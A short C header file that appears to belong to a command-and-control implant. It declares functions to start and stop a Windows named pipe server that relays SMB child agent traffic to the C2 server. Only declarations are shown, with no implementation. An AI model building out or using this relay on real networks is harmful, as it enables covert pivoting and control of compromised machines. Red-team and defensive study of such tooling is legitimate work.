#pragma once
#include <windows.h>

// Start a named pipe server that relays SMB child agent traffic to the C2.
// pipe_name may be a bare name ("svc_abc") or a full UNC ("\\.\pipe\svc_abc").
// Returns heap-allocated status string (caller must free).
char* pipe_server_start(const char *pipe_name);

// Stop a named pipe server.  Pass NULL or "" to stop all.
// Returns heap-allocated status string (caller must free).
char* pipe_server_stop(const char *pipe_name);
